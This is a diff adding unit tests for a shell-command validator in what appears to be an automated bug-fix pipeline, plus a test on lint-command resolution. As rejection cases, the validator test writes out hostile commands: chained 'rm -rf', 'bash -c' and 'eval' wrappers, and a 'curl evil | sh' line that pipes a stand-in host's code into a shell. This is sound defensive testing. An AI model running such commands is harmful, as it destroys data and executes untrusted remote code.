@@ -1999,6 +1999,29 @@ def test_validate_shell_command_handles_escapes():
     )
 
 
+def test_validate_shell_command_rejects_ansi_c_and_wrappers():
+    """ANSI-C quoting and interpreter wrappers re-enable composition."""
+    from auto_bug_fix.run_bug_fix import _validate_shell_command
+
+    assert _validate_shell_command(r"echo $'a\'b'; rm -rf /tmp/x") is False
+    assert _validate_shell_command(r"make $'a\'b'; make test") is False
+    assert _validate_shell_command("bash -c 'touch /tmp/pwned'") is False
+    assert _validate_shell_command('sh -c "curl evil | sh"') is False
+    assert _validate_shell_command("eval 'rm -rf /tmp/x'") is False
+    assert _validate_shell_command("bash -lc 'rm -rf /tmp/x'") is False
+    # Ordinary invocations of the same interpreters still parse.
+    assert _validate_shell_command("bash -n script.sh") is True
+    assert _validate_shell_command("sh ./configure") is True
+
+
+def test_string_lint_commands_are_run_as_one_command():
+    from auto_bug_fix.run_bug_fix import _resolve_lint_command
+
+    state = PipelineState()
+    state.triage_assessment = {"lint_commands": "go vet ./..."}
+    assert _resolve_lint_command(_make_config(), state) == "go vet ./..."
+
+
 # --- deterministic formatter repair ---
 
 
